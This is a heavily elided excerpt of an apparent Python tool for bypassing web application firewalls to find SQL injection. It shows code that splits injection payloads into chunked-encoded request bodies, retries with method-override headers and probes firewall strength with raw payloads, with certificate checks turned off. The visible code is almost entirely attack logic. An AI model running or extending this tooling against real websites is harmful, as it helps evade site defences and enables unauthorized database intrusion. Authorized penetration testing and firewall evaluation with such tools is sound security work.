...
logger = get_logger("waf_heavy_bypass")
...
# ---------------------------------------------------------------------------
# SQLi Heavy Bypass Payload Generator
# ---------------------------------------------------------------------------
...
# ---------------------------------------------------------------------------
# HTTP-level Bypass (HPP, Content-Type switching, etc)
# ---------------------------------------------------------------------------
    ...
    if not result["vulnerable"] and "chunked" in WAF_BYPASS_STRATEGIES.get(waf_name, {}).get("priority", []):
        try:
            ...
            for i in range(0, len(f"{param}={test_payload}"), 2):
                chunk = f"{param}={test_payload}"[i:i + 2]
                body += f"{len(chunk):x}\r\n{chunk}\r\n"
            body += "0\r\n\r\n"
            r = sess.post(url, data=body, headers=chunk_headers, timeout=timeout, verify=False)
            if _indicates_injection(r, None):
                result["vulnerable"] = True
                result["bypasses"].append({
                    "technique": "chunked",
    ...
    if not result["vulnerable"]:
        for method in ["GET", "POST", "PUT", "PATCH"]:
            try:
                ...
                r = sess.get(build_url(url, param, test_payload),
                             headers=override_headers, timeout=timeout, verify=False)
                if _indicates_injection(r, None):
                    result["vulnerable"] = True
                    result["bypasses"].append({
...
def test_waf_strength(url: str, sess: "requests.Session",
    ...
    for payload in raw_tests:
        try:
            r = sess.get(build_url(url, "id", payload), timeout=timeout, verify=False)
